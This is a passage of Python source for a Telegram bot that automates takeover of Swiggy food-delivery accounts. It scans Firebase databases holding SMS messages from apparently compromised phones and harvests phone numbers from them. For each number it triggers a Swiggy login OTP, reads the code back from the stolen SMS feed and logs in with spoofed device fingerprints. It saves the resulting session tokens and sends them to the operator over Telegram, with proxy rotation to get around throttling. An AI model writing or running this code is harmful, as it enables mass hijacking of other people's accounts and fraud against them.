            if r.status_code == 403:
                blocked = record_403()
                if blocked:
                    wait_if_blocked()
                return {"ok": False, "raw": data, "tid": None, "sid": None,
                        "statusMessage": "HTTP 403", "statusCode": 403, "http_status": 403}

            clear_403()
            data_inner = data.get("data") if isinstance(data.get("data"), dict) else {}
            ok = r.status_code == 200 and (
                data.get("statusCode") in (0, 1, None)
                or data.get("tid") or data_inner.get("tid")
            )
            msg = (data.get("statusMessage") or data.get("message")
                   or data_inner.get("statusMessage") or data_inner.get("message")
                   or (f"HTTP {r.status_code}" if r.status_code != 200 else ""))
            return {
                "ok": ok, "raw": data,
                "tid": data.get("tid") or data_inner.get("tid"),
                "sid": data.get("sid") or data_inner.get("sid"),
                "statusMessage": msg,
                "statusCode": data.get("statusCode"),
                "http_status": r.status_code,
            }
        except requests.exceptions.ProxyError as exc:
            logger.warning(f"⚠️ Proxy connection error (407/auth/down) — retrying directly: {exc}")
            try:
                direct_s = requests.Session()
                direct_s.verify = False
                r = direct_s.get(f"{SMS_OTP_URL}?mobile={phone}",
                                 headers=headers, timeout=REQUEST_TIMEOUT)
                data = r.json() if r.content else {}
                data_inner = data.get("data") if isinstance(data.get("data"), dict) else {}
                ok = r.status_code == 200 and (
                    data.get("statusCode") in (0, 1, None)
                    or data.get("tid") or data_inner.get("tid")
                )
                msg = (data.get("statusMessage") or data.get("message")
                       or data_inner.get("statusMessage") or data_inner.get("message")
                       or (f"HTTP {r.status_code}" if r.status_code != 200 else ""))
                return {
                    "ok": ok, "raw": data,
                    "tid": data.get("tid") or data_inner.get("tid"),
                    "sid": data.get("sid") or data_inner.get("sid"),
                    "statusMessage": msg,
                    "statusCode": data.get("statusCode"),
                    "http_status": r.status_code,
                }
            except Exception as direct_exc:
                last_exc = direct_exc
                break
        except (requests.Timeout, requests.ConnectionError) as exc:
            last_exc = exc
            time.sleep(0.4 * attempt)
        except Exception as exc:
            last_exc = exc
            break
    return {"ok": False, "raw": {"error": str(last_exc)}, "tid": None, "sid": None,
            "statusMessage": f"network: {last_exc}", "statusCode": None, "http_status": 0}


def verify_otp_swiggy(otp: str, tid: str, sid: str, headers: dict, sess: requests.Session = None) -> dict:
    wait_if_blocked()
    req_headers = {**headers, "sid": sid or "", "Tid": tid or ""}
    payload = {
        "cloningSignalsData": {
            "appFilesDirPathInvalid": 0, "developerModeEnabled": 0,
            "deviceModelVmos": 0, "emulatorStatus": 0,
            "packageName": "in.swiggy.android", "workProfileEnabled": 0,
        },
        "otp": otp,
    }
    last_exc = None
    for attempt in range(1, HTTP_RETRIES + 1):
        s = sess if sess is not None else get_swiggy_session()
        try:
            r = s.post(f"{VERIFY_URL}?otp_source=Sms-automatic",
                       headers=req_headers, json=payload, timeout=REQUEST_TIMEOUT)
            try:
                data = r.json() if r.content else {}
            except Exception:
                data = {"_parse_error": True, "_body": (r.text or "")[:300]}

            if r.status_code == 403:
                record_403()
                return {"ok": False, "token": "", "statusMessage": "HTTP 403",
                        "raw": data, "tid": tid, "sid": sid, "customerId": "", "http_status": 403}

            clear_403()
            data_inner = data.get("data") if isinstance(data.get("data"), dict) else {}
            token = (data_inner.get("token") or data.get("token")
                     or data_inner.get("accessToken") or "")
            is_unreg = r.status_code == 200 and (data_inner.get("registered") is False or (data.get("statusCode") == 0 and not token))
            if is_unreg and not token:
                token = "UNREGISTERED_ACCOUNT"
            ok  = r.status_code == 200 and bool(token)
            cid = str(data_inner.get("customerId") or data_inner.get("userid")
                      or data_inner.get("userId") or "")
            msg = (data.get("statusMessage") or data.get("message")
                   or data_inner.get("statusMessage") or data_inner.get("message")
                   or (f"HTTP {r.status_code}" if r.status_code != 200 else ""))
            return {"ok": ok, "token": token, "is_unreg": is_unreg,
                    "tid": data.get("tid") or tid, "sid": data.get("sid") or sid,
                    "raw": data, "statusMessage": msg, "customerId": cid,
                    "http_status": r.status_code}
        except requests.exceptions.ProxyError as exc:
            logger.warning(f"⚠️ Proxy connection error (407/auth/down) — retrying verify directly: {exc}")
            try:
                direct_s = requests.Session()
                direct_s.verify = False
                r = direct_s.post(f"{VERIFY_URL}?otp_source=Sms-automatic",
                                  headers=req_headers, json=payload, timeout=REQUEST_TIMEOUT)
                data = r.json() if r.content else {}
                data_inner = data.get("data") if isinstance(data.get("data"), dict) else {}
                token = (data_inner.get("token") or data.get("token")
                         or data_inner.get("accessToken") or "")
                is_unreg = r.status_code == 200 and (data_inner.get("registered") is False or (data.get("statusCode") == 0 and not token))
                if is_unreg and not token:
                    token = "UNREGISTERED_ACCOUNT"
                ok = r.status_code == 200 and bool(token)
                cid = str(data_inner.get("customerId") or data_inner.get("userid")
                          or data_inner.get("userId") or "")
                msg = (data.get("statusMessage") or data.get("message")
                       or data_inner.get("statusMessage") or data_inner.get("message")
                       or (f"HTTP {r.status_code}" if r.status_code != 200 else ""))
                return {
                    "ok": ok, "token": token, "is_unreg": is_unreg,
                    "tid": data.get("tid") or tid, "sid": data.get("sid") or sid,
                    "raw": data, "statusMessage": msg, "customerId": cid,
                    "http_status": r.status_code,
                }
            except Exception as direct_exc:
                last_exc = direct_exc
                break
        except (requests.Timeout, requests.ConnectionError) as exc:
            last_exc = exc
            time.sleep(0.4 * attempt)
        except Exception as exc:
            last_exc = exc
            break
    return {"ok": False, "token": "", "statusMessage": f"network: {last_exc}",
            "raw": {"error": str(last_exc)}, "tid": tid, "sid": sid,
            "customerId": "", "http_status": 0}


# ═══════════════════════════════════════════════════════════════════════════════
# FIREBASE — DEVICE EXTRACTION (bharat_final.py style, Swiggy-aware)
# ═══════════════════════════════════════════════════════════════════════════════

def _is_online(dev: dict) -> bool:
    for field in ONLINE_STATUS_FIELDS:
        raw = dev.get(field)
        if raw is None:
            continue
        if isinstance(raw, bool):
            return raw
        if isinstance(raw, int):
            return raw == 1
        if str(raw).lower().strip() in ONLINE_TRUE_VALUES:
            return True
    return False


def _load_firebase_root(firebase_url: str) -> tuple[str | None, dict | None]:
    for key in ROOT_KEYS:
        try:
            r = _http.get(f"{firebase_url}{key}.json", timeout=12)
            if r.status_code != 200:
                continue
            data = r.json()
            if isinstance(data, dict) and len(data) > 0:
                return key, data
        except Exception:
            continue
    return None, None


def _device_recency(firebase_url: str, cid: str) -> float | None:
    try:
        r = _http.get(f"{firebase_url}messages/{cid}.json?shallow=true", timeout=6)
        if r.status_code != 200:
            return None
        d = r.json()
        if not isinstance(d, dict) or not d:
            return None
        numeric = [int(k) for k in d.keys() if str(k).lstrip("-").isdigit()]
        if not numeric:
            return None
        last_ms  = max(numeric)
        age_min  = (time.time() * 1000 - last_ms) / 60000
        return age_min
    except Exception:
        return None


def _fetch_phones_from_messages(firebase_url: str, cid: str, top_n: int = 10) -> list[str]:
    for sub in ["messages", "sms", "inbox", "Sms", "SMS", "notifications"]:
        try:
            r = _http.get(f"{firebase_url}{sub}/{cid}.json", timeout=8)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, dict) and data:
                    return _phones_from_messages(data, top_n=top_n)
        except Exception:
            pass
    return []


def extract_devices(firebase_url: str, log_func) -> list[dict]:
    """
    Returns list of dicts: {client_id, phones: [...], age_min}
    Uses bharat_final.py structure with parallel checks.
    """
    if not firebase_url.endswith("/"):
        firebase_url += "/"

    root_key, raw_data = _load_firebase_root(firebase_url)
    if not raw_data:
        _DEAD_THIS_SCAN.add(firebase_url)
        return []

    panel_name = (urlparse(firebase_url).hostname or firebase_url)[:25]
    all_devs   = {cid: d for cid, d in raw_data.items() if isinstance(d, dict)}
    online     = {cid: d for cid, d in all_devs.items() if _is_online(d)}
    log_func(f"🔥 {panel_name}: {len(online)}/{len(all_devs)} online")
    if not online:
        return []

    # check which cids have messages
    try:
        r = _http.get(f"{firebase_url}messages.json?shallow=true", timeout=10)
        msg_cids = set((r.json() or {}).keys()) if r.status_code == 200 else set()
    except Exception:
        msg_cids = set()

    candidates = {cid: dev for cid, dev in online.items() if cid in msg_cids}
    # if no messages node, fall back to all online (some FBs use different structure)
    if not candidates:
        candidates = online
    log_func(f"📨 {panel_name}: {len(candidates)} candidates")
    if not candidates:
        return []

    # filter by recency (< 48h)
    live: dict[str, tuple[dict, float]] = {}
    skipped = 0
    lock    = threading.Lock()

    def check_recency(cid: str, dev: dict) -> None:
        nonlocal skipped
        age_min = _device_recency(firebase_url, cid)
        with lock:
            if age_min is not None and age_min <= MAX_AGE_MINUTES:
                live[cid] = (dev, age_min)
            else:
                skipped += 1

    with ThreadPoolExecutor(max_workers=min(100, len(candidates))) as ex:
        futs = [ex.submit(check_recency, cid, dev) for cid, dev in candidates.items()]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass

    log_func(f"📊 {panel_name}: {len(live)} live (<48h), {skipped} too old")
    if not live:
        # if all timestamps missing, include all candidates
        for cid, dev in candidates.items():
            live[cid] = (dev, 0.0)
        log_func(f"📊 {panel_name}: no timestamps — using all {len(live)} online")

    result: list[dict] = []
    lock2  = threading.Lock()

    def proc(item: tuple) -> None:
        cid, (dev, age_min) = item
        field_phone = _phone_from_device_fields(dev)
        if field_phone:
            phones_list = [field_phone]
        else:
            phones_list = _fetch_phones_from_messages(firebase_url, cid, top_n=10)
            if not phones_list:
                # last resort: scan whole device record
                phones_list = list(find_phones(dev))
        if not phones_list:
            return
        with lock2:
            result.append({
                "client_id": cid,
                "phones":    phones_list,
                "age_min":   age_min,
                "panel":     firebase_url,
            })

    with ThreadPoolExecutor(max_workers=min(100, len(live))) as ex:
        futs = [ex.submit(proc, item) for item in live.items()]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass

    result.sort(key=lambda x: x["age_min"])
    total_phones = sum(len(d["phones"]) for d in result)
    log_func(f"✅ {panel_name}: {len(result)} devices, {total_phones} phones")
    return result


# ═══════════════════════════════════════════════════════════════════════════════
# OTP POLLING (Firebase, Swiggy sender filter)
# ═══════════════════════════════════════════════════════════════════════════════

SMS_POLL_PATHS = [
    "messages/{cid}", "sms/{cid}", "notifications/{cid}",
    "notification/{cid}", "inbox/{cid}", "received/{cid}",
    "sendSms/{cid}", "{cid}",
]


def capture_device_baseline(panel: str, cid: str) -> set[str]:
    baseline: set[str] = set()
    for tmpl in SMS_POLL_PATHS:
        path = tmpl.format(cid=cid)
        try:
            r = _http.get(f"{panel}{path}.json?shallow=true", timeout=4)
            if r.status_code == 200:
                d = r.json()
                if isinstance(d, dict):
                    for k in d.keys():
                        baseline.add(f"{path}|{k}")
        except Exception:
            pass
    return baseline


def wait_for_swiggy_otp(panel: str, cid: str, baseline: set[str], after_ms: int,
                         log_func, timeout: int = OTP_TIMEOUT) -> str | None:
    """
    Polls Firebase SMS paths for a fresh Swiggy OTP that arrived after after_ms
    and was not in baseline.
    """
    deadline = time.time() + timeout
    _nk      = lambda k: int(k) if str(k).lstrip("-").isdigit() else 0  # noqa

    while time.time() < deadline:
        if not AUTO_RUNNING:
            return None
        for tmpl in SMS_POLL_PATHS:
            path = tmpl.format(cid=cid)
            try:
                r = _http.get(
                    f'{panel}{path}.json?orderBy="$key"&limitToLast=20',
                    timeout=5,
                )
                if r.status_code != 200:
                    continue
                msgs = r.json()
                if not isinstance(msgs, dict):
                    continue
                for k in sorted(msgs.keys(), key=_nk, reverse=True):
                    tag = f"{path}|{k}"
                    if tag in baseline:
                        continue
                    # Skip old messages if key is timestamp
                    if str(k).isdigit() and len(str(k)) >= 12:
                        if int(k) < after_ms - 15000:
                            baseline.add(tag)
                            continue
                    msg = msgs[k]
                    if not isinstance(msg, dict):
                        baseline.add(tag)
                        continue
                    body   = str(msg.get("message") or msg.get("body") or msg.get("text") or "")
                    sender = str(msg.get("sender") or msg.get("address") or "")
                    is_swiggy = (
                        "SWIGGY" in sender.upper()
                        or "SWIGGY" in body.upper()
                        or "swiggy" in body.lower()
                    )
                    if is_swiggy:
                        otp = parse_swiggy_otp(body)
                        if otp:
                            log_func(f"📩 Fresh OTP: {otp} (sender: {sender or 'unknown'})")
                            return otp
                    baseline.add(tag)
            except Exception:
                pass
        time.sleep(random.uniform(POLL_MIN, POLL_MAX))
    return None


# ═══════════════════════════════════════════════════════════════════════════════
# PROCESS ONE PHONE (Swiggy)
# ═══════════════════════════════════════════════════════════════════════════════

def process_swiggy_single(phone: str, cid: str, panel: str, log_func) -> bool:
    if already_saved(phone):
        log_func(f"⏭ {phone}: already saved — skip")
        with USED_NUMBERS_LOCK:
            USED_NUMBERS.add(phone)
        # Track in sessions_used.json
        try:
            with _sessions_lock:
                ul = _load_json_list(SESSIONS_USED)
                if not any(isinstance(s, dict) and str(s.get("mobile", "")).strip() == phone for s in ul):
                    ul.append({"mobile": phone, "skippedAt": now_iso()})
                    _atomic_save(SESSIONS_USED, ul)
        except Exception:
            pass
        return False

    log_func(f"👤 Processing +91{phone}…")

    for attempt in range(1, MAX_RETRIES + 2):
        fp      = generate_device_fingerprint()
        headers = build_login_headers(fp)
        sess    = get_swiggy_session()

        # Step 1: get baseline snapshot of existing SMS before sending OTP
        baseline = capture_device_baseline(panel, cid)
        after_ms = int(time.time() * 1000)

        # Step 2: request OTP using persistent session
        req = send_otp_swiggy(phone, headers, sess=sess)
        sw_msg = _swiggy_msg(req)

        if req.get("http_status") == 403:
            log_func(f"⛔ {phone}: 403 — IP throttled")
            STATS["fails"] += 1
            with USED_NUMBERS_LOCK:
                USED_NUMBERS.add(phone)
            save_store()
            return False

        if not req["ok"]:
            reason = sw_msg or req.get("statusMessage") or "request failed"
            log_func(f"❌ {phone}: OTP send fail — {reason[:60]}")
            STATS["fails"] += 1
            with FAILED_PANELS_LOCK:
                FAILED_PANELS.add(panel)
            if any(x in str(reason).lower() for x in ("exceeded", "2 hour", "too many", "limit", "blocked")):
                with USED_NUMBERS_LOCK:
                    USED_NUMBERS.add(phone)
                # Track in sessions_blocked.json
                try:
                    with _sessions_lock:
                        bl = _load_json_list(SESSIONS_BLOCKED)
                        if not any(isinstance(s, dict) and str(s.get("mobile", "")).strip() == phone for s in bl):
                            bl.append({"mobile": phone, "reason": str(reason)[:200], "blockedAt": now_iso()})
                            _atomic_save(SESSIONS_BLOCKED, bl)
                except Exception:
                    pass
                save_store()
                return False
            if attempt <= MAX_RETRIES:
                time.sleep(1.5)
                continue
            with USED_NUMBERS_LOCK:
                USED_NUMBERS.add(phone)
            save_store()
            return False

        tid = str(req.get("tid") or "").strip()
        sid = str(req.get("sid") or "").strip()
        log_func(f"⏳ {phone}: OTP sent ✓ tid={tid[:16]}… — polling Firebase ({OTP_TIMEOUT}s)…")

        # Step 3: poll for freshly arrived OTP
        otp = wait_for_swiggy_otp(panel, cid, baseline, after_ms, log_func, OTP_TIMEOUT)
        if not otp:
            log_func(f"⏳ {phone}: OTP timeout (attempt {attempt})")
            with FAILED_PANELS_LOCK:
                FAILED_PANELS.add(panel)
            if attempt <= MAX_RETRIES:
                time.sleep(1.0)
                continue
            STATS["fails"] += 1
            with USED_NUMBERS_LOCK:
                USED_NUMBERS.add(phone)
            save_store()
            return False

        if not otp.isdigit() or not (4 <= len(otp) <= 8):
            log_func(f"❌ {phone}: bad OTP '{otp}' — skip")
            STATS["fails"] += 1
            with USED_NUMBERS_LOCK:
                USED_NUMBERS.add(phone)
            save_store()
            return False

        log_func(f"🔑 {phone}: OTP {otp} → verifying…")

        if not tid:
            log_func(f"❌ {phone}: missing tid — cannot verify")
            STATS["fails"] += 1
            with USED_NUMBERS_LOCK:
                USED_NUMBERS.add(phone)
            save_store()
            return False

        # Step 4: verify using the SAME session (preserves cookies & connection)
        time.sleep(0.15)
        ver = verify_otp_swiggy(otp, tid, sid, headers, sess=sess)

        if not ver["ok"] or not ver.get("token"):
            reason = _swiggy_msg(ver) or ver.get("statusMessage") or "verify failed"
            log_func(f"❌ {phone}: verify fail — {reason[:60]}")
            STATS["fails"] += 1
            with USED_NUMBERS_LOCK:
                USED_NUMBERS.add(phone)
            save_store()
            return False

        # Step 5: save session
        full_rec = {
            "sessionId":       uuid.uuid4().hex,
            "mobile":          phone,
            "token":           ver.get("token", ""),
            "sid":             ver.get("sid", ""),
            "tid":             ver.get("tid", ""),
            "deviceId":        fp["deviceId"],
            "androidId":       fp["androidId"],
            "swuid":           fp["swuid"],
            "model":           fp["model"],
            "manufacturer":    fp["manufacturer"],
            "osVersion":       fp["osVersion"],
            "appVersion":      fp["appVersion"],
            "versionCode":     fp["versionCode"],
            "userAgent":       fp["userAgent"],
            "fingerprintHash": fp["fingerprintHash"],
            "customerId":      ver.get("customerId", ""),
            "otp":             otp,
            "sourceDevice":    cid,
            "sourcePanelHost": (urlparse(panel).hostname or panel),
            "fingerprint":     fp,
            "completedAt":     now_iso(),
            "accountType":     "NEW" if ver.get("is_unreg") else "EXISTING",
            "needsProfileSetup": bool(ver.get("is_unreg")),
        }
        save_session_record(full_rec)
        append_log_entry({"phone": phone, "status": "success", "otp": otp,
                           "token": bool(ver.get("token")), "customerId": ver.get("customerId"),
                           "ts": now_iso()})

        STATS["processed"] += 1
        STATS["wins"]      += 1
        cust = "(Fresh Account)" if ver.get("is_unreg") else (ver.get("customerId") or "-")
        log_func(f"🔓 {phone}: LOGIN SUCCESS ✓  customerId={cust}")

        # Send Telegram notification
        _send_win_notification(phone, ver, fp, otp, panel)

        with USED_NUMBERS_LOCK:
            USED_NUMBERS.add(phone)
        save_store()
        return True

    return False


def process_device(device: dict, log_func) -> None:
    cid    = device["client_id"]
    panel  = device["panel"]
    phones = device["phones"]

    with DEVICE_LOCK_MUTEX:
        if cid not in DEVICE_LOCK:
            DEVICE_LOCK[cid] = threading.Lock()
        dev_lock = DEVICE_LOCK[cid]

    with dev_lock:
        for phone in phones:
            if not AUTO_RUNNING:
                return
            with USED_NUMBERS_LOCK:
                if phone in USED_NUMBERS:
                    continue
            success = process_swiggy_single(phone, cid, panel, log_func)
            if success:
                log_func(f"✅ Device {cid[:8]}: {phone} success → next device")
                return
        log_func(f"📵 Device {cid[:8]}: all {len(phones)} phones exhausted")


# ═══════════════════════════════════════════════════════════════════════════════
# TELEGRAM WIN NOTIFICATION
# ═══════════════════════════════════════════════════════════════════════════════

def _send_win_notification(phone: str, ver: dict, fp: dict, otp: str, panel: str) -> None:
    cust  = ver.get("customerId") or ""
    token = ver.get("token", "")
    sid   = ver.get("sid", "")
    tid   = ver.get("tid", "")
    dev_id = fp.get("deviceId", "")
    host  = (urlparse(panel).hostname or panel)[:40]
    is_new = (token == "UNREGISTERED_ACCOUNT" or not cust)
    acct_type = "🆕 NEW ACCOUNT" if is_new else "✅ EXISTING"

    # Header message (HTML)
    setup_note = "\n⚠️ <b>NEW ACC</b> — needs profile setup (name/email) before ordering!" if is_new else ""
    header = (
        f"🎉 <b>SWIGGY LOGIN SUCCESS!</b> {acct_type}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 <b>+91{phone}</b>  |  🆔 <code>{cust or 'NEW'}</code>\n"
        f"🔑 OTP: <code>{otp}</code>  |  📡 <code>{host}</code>\n"
        f"📲 {fp.get('model','?')} Android {fp.get('osVersion','?')} · App v{fp.get('appVersion','?')}"
        f"{setup_note}"
    )

    # JSON export (matches the screenshot format)
    export_data = {
        "mobile": phone,
        "token": token,
        "sid": sid,
        "tid": tid,
        "deviceId": dev_id,
        "customerId": cust,
    }
    json_block = f"<b>🗂 Swiggy Session Export (+91 {phone})</b>\n\n<pre><code class=\"language-json\">{json.dumps(export_data, indent=4, ensure_ascii=False)}</code></pre>"

    try:
        for uid in list(user_sessions.keys()):
            bot.send_message(uid, header, parse_mode="HTML", disable_web_page_preview=True)
            bot.send_message(uid, json_block, parse_mode="HTML", disable_web_page_preview=True)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN WORKER
# ═══════════════════════════════════════════════════════════════════════════════

def run_worker() -> None:
    global AUTO_RUNNING
    add_to_queue("🔍 Starting Firebase scan (parallel)…")
    panels = STORE.get("panels", [])
    total_panels = len(panels)
    if not panels:
        add_to_queue("❌ No panels configured! Add panels first.")
        AUTO_RUNNING = False
        return

    # normalize URLs
    norm_panels: list[str] = []
    seen_hosts: set[str] = set()
    for p in panels:
        p = p.strip()
        if not p or p.startswith("#"):
            continue
        if p.startswith("http://"):
            p = "https://" + p[7:]
        if not p.startswith("https://"):
            p = "https://" + p
        p = p.rstrip("/") + "/"
        host = (urlparse(p).hostname or "").lower()
        if host and host not in seen_hosts:
            seen_hosts.add(host)
            norm_panels.append(p)

    add_to_queue(f"📋 {len(norm_panels)} unique panels to scan")
    # Filter out disabled/dead panels
    disabled_hosts = _load_disabled_panels() | DISABLED_PANELS
    before_count = len(norm_panels)
    norm_panels = [p for p in norm_panels
                   if (urlparse(p).hostname or "").lower() not in disabled_hosts]
    if before_count != len(norm_panels):
        add_to_queue(f"⛔ Skipped {before_count - len(norm_panels)} disabled panels")
    _DEAD_THIS_SCAN.clear()
    total_found = 0
    workers     = STORE.get("workers", WORKERS)

    # ── PRE-SORT: quick online-count per panel, highest first ─────────────────
    add_to_queue(f"📊 Pre-scanning {len(norm_panels)} panels for online count…")

    def _quick_online_count(panel_url: str) -> tuple[str, int]:
        """Lightweight: grab root key and count online devices."""
        for key in ROOT_KEYS:
            try:
                r = _http.get(f"{panel_url}{key}.json", timeout=8)
                if r.status_code == 200:
                    full = r.json()
                    if isinstance(full, dict) and full:
                        count = sum(1 for d in full.values()
                                    if isinstance(d, dict) and _is_online(d))
                        return panel_url, count
            except Exception:
                continue
        return panel_url, 0

    _pre_counts: dict[str, int] = {}
    with ThreadPoolExecutor(max_workers=min(64, len(norm_panels) or 1)) as _ex:
        _futs = {_ex.submit(_quick_online_count, p): p for p in norm_panels}
        for _f in as_completed(_futs):
            try:
                _url, _cnt = _f.result()
                _pre_counts[_url] = _cnt
                _host_key = (urlparse(_url).hostname or "").lower()
                with _PANEL_ONLINE_LOCK:
                    _PANEL_ONLINE_COUNTS[_host_key] = _cnt
            except Exception:
                pass

    norm_panels.sort(key=lambda p: _pre_counts.get(p, 0), reverse=True)
    if norm_panels:
        _top = (urlparse(norm_panels[0]).hostname or norm_panels[0])[:25]
        add_to_queue(f"📊 Sorted! Top: {_top} ({_pre_counts.get(norm_panels[0], 0)} online)")

    for i, panel in enumerate(norm_panels, 1):
        if not AUTO_RUNNING:
            break
        panel_name = (urlparse(panel).hostname or panel)[:25]
        add_to_queue(f"[{i}/{len(norm_panels)}] Scanning {panel_name}…")

        devs = extract_devices(panel, add_to_queue)
        if not devs:
            if panel in _DEAD_THIS_SCAN:
                _disable_panel(panel)
                add_to_queue(f"💀 {panel_name}: DEAD firebase — auto-disabled")
            else:
                add_to_queue(f"⚠️ {panel_name}: no devices — next panel")
            continue

        total_found += len(devs)
        add_to_queue(f"🚀 {panel_name}: {len(devs)} devices found — processing…")

        skipped_used = 0
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futures = []
            for dev in devs:
                if not AUTO_RUNNING:
                    break
                with USED_NUMBERS_LOCK:
                    all_used = all(ph in USED_NUMBERS for ph in dev["phones"])
                if all_used:
                    skipped_used += 1
                    STATS["skipped"] += 1
                    continue
                futures.append(ex.submit(process_device, dev, add_to_queue))
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception as exc:
                    add_to_queue(f"⚠️ worker error: {exc}")

        if skipped_used:
            add_to_queue(f"⏭ {panel_name}: {skipped_used} devices skipped (all numbers used)")
        add_to_queue(f"✅ {panel_name} complete")

    if total_found == 0:
        add_to_queue("❌ No online devices found in any panel.")

    AUTO_RUNNING = False
    add_to_queue("🏁 All panels complete. Waiting for next run…")


def live_status_updater(admin_chat_id: int) -> None:
    global LIVE_MSG_ID
    last_text = ""
    # keep running 3 extra ticks after scan stops so final state is shown
    extra_ticks = 3

    while AUTO_RUNNING or extra_ticks > 0:
        if not AUTO_RUNNING:
            extra_ticks -= 1

        with LIVE_LOCK:
            logs = list(LIVE_QUEUE)

        # Escape any HTML special chars in log lines
        def _esc(s: str) -> str:
            return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

        # Keep only last 10 log lines & truncate total to fit Telegram 4096 char limit
        recent = logs[-10:] if logs else ["Initializing…"]
        log_lines = "\n".join(_esc(l) for l in recent)
        if len(log_lines) > 2500:
            log_lines = log_lines[-2500:]

        px = current_proxy()
        px_label = "Direct"
        if px:
            px_label = px.split("@")[-1] if "@" in px else px
        px_info = f"🌐 <code>{px_label[:30]}</code>  403s: {_total_403}" if px else "🌐 Direct IP"
        status_icon = "🟢 RUNNING" if AUTO_RUNNING else "🏁 DONE"

        txt = (
            f"⚙️ <b>Swiggy Auto — {status_icon}</b>\n"
            f"<pre>{log_lines}</pre>\n\n"
            f"✅ Wins: <b>{STATS['wins']}</b>  ❌ Fails: <b>{STATS['fails']}</b>  ⏭ Skip: <b>{STATS['skipped']}</b>\n"
            f"📊 Processed: <b>{STATS['processed']}</b>\n"
            f"{px_info}"
        )

        # Final safety: truncate entire msg to 4000 chars
        if len(txt) > 4000:
            txt = txt[:3990] + "…</pre>"

        # Only send/edit if content actually changed
        if txt != last_text:
            try:
                if LIVE_MSG_ID:
                    bot.edit_message_text(
                        txt, admin_chat_id, LIVE_MSG_ID,
                        parse_mode="HTML",
                        disable_web_page_preview=True,
                    )
                else:
                    m = bot.send_message(
                        admin_chat_id, txt,
                        parse_mode="HTML",
                        disable_web_page_preview=True,
                    )
                    LIVE_MSG_ID = m.message_id
                last_text = txt
            except Exception as e:
                # If edit fails (message too old, unchanged, etc.) try sending fresh
                err = str(e).lower()
                if "message is not modified" in err:
                    pass  # fine, same content
                elif "message to edit not found" in err:
                    LIVE_MSG_ID = None  # force new message next tick
                else:
                    # Send a fresh message for any other error
                    try:
                        LIVE_MSG_ID = None
                        m = bot.send_message(
                            admin_chat_id, txt,
                            parse_mode="HTML",
                            disable_web_page_preview=True,
                        )
                        LIVE_MSG_ID = m.message_id
                        last_text = txt
                    except Exception:
                        pass

        time.sleep(2)


# ═══════════════════════════════════════════════════════════════════════════════
# PANEL URL PARSING
# ═══════════════════════════════════════════════════════════════════════════════

def _parse_firebase_urls(raw_text: str) -> dict:
    """
    Parse Firebase URLs from raw text in any format.
    Returns dict with:
      - 'added': list of newly added URLs
      - 'duplicate': list of URLs already in panels.txt
      - 'invalid': count of lines that looked like URLs but weren't Firebase
    """
    added: list[str] = []
    duplicate: list[str] = []
    invalid = 0

    # Build current host set for fast dedup
    existing_hosts: set[str] = set()
    for p in STORE.get("panels", []):
        h = (urlparse(p).hostname or "").lower()
        if h:
            existing_hosts.add(h)

    # Also check panels.txt on disk (may have entries not yet in STORE)
    if PANELS_FILE.exists():
        for line in PANELS_FILE.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                h = (urlparse(line).hostname or "").lower()
                if h:
                    existing_hosts.add(h)

    # Also check disabled panels
    disabled_hosts = _load_disabled_panels() | DISABLED_PANELS

    # Extract all URLs — support newline, comma, space, tab separated
    # Also handles raw hostnames without scheme
    candidates: list[str] = []
    # First try to extract proper URLs via regex
    url_re = re.compile(
        r'https?://[^\s,"\'\]\[<>]+', re.I
    )
    found_urls = url_re.findall(raw_text)
    # Also try bare hostnames like rto43-32636-default-rtdb.firebaseio.com
    bare_re = re.compile(
        r'(?<![/\w])([\w\-]+\.(?:firebaseio\.com|firebasedatabase\.app)(?:/[\S]*)?)',
        re.I
    )
    for m in bare_re.finditer(raw_text):
        candidates.append("https://" + m.group(1))
    for u in found_urls:
        candidates.append(u)

    seen_this_batch: set[str] = set()
    for raw_url in candidates:
        url = raw_url.strip().rstrip(".,;\"'")
        if not url:
            continue
        # Normalize scheme
        if url.startswith("http://"):
            url = "https://" + url[7:]
        if not url.startswith("https://"):
            url = "https://" + url
        # Must be firebase
        if "firebaseio.com" not in url and "firebasedatabase.app" not in url:
            invalid += 1
            continue
        # Ensure trailing slash
        if not url.endswith("/"):
            url += "/"
        host = (urlparse(url).hostname or "").lower()
        if not host:
            invalid += 1
            continue
        # Dedup within this batch
        if host in seen_this_batch:
            continue
        seen_this_batch.add(host)

        if host in disabled_hosts:
            duplicate.append(url)   # treat disabled as "already there"
            continue
        if host in existing_hosts:
            duplicate.append(url)
            continue
        # New! Add to store and panels.txt
        STORE.setdefault("panels", []).append(url)
        existing_hosts.add(host)
        added.append(url)

    # Write newly added to panels.txt
    if added:
        try:
            with open(PANELS_FILE, "a", encoding="utf-8") as f:
                for u in added:
                    f.write(u + "\n")
        except Exception:
            pass

    return {"added": added, "duplicate": duplicate, "invalid": invalid}


# ═══════════════════════════════════════════════════════════════════════════════
# TELEGRAM BOT HANDLERS
# ═══════════════════════════════════════════════════════════════════════════════

def _reply_keyboard() -> types.ReplyKeyboardMarkup:
    """Persistent keyboard in the typing bar area — always visible."""
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, is_persistent=True)
    kb.row("🎛 Control Panel")
    kb.row("▶️ Start Scan", "⏹ Stop", "📊 Status")
    kb.row("📋 Panels", "📄 Sessions", "📥 Export ZIP")
    kb.row("➕ Add Panel", "🗑 Clear Used", "🔁 Re-run All")
    kb.row("🧪 Proxies", "⚠️ Rerun Failed", "/start")
    return kb


def _main_keyboard() -> types.InlineKeyboardMarkup:
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    status   = "🟢 RUNNING" if AUTO_RUNNING else "🔴 STOPPED"
    workers  = STORE.get("workers", WORKERS)
    sess_count = len(_load_json_list(SESSIONS_FULL))
    panel_count = len(STORE.get("panels", []))
    disabled_count = len(DISABLED_PANELS)
    px       = current_proxy()
    px_label = "Direct" if not px else (px.split("@")[-1] if "@" in px else px)[:20]
    px_count = len(_proxy_pool)
    with USED_NUMBERS_LOCK:
        used_count = len(USED_NUMBERS)
    with FAILED_PANELS_LOCK:
        failed_count = len(FAILED_PANELS)

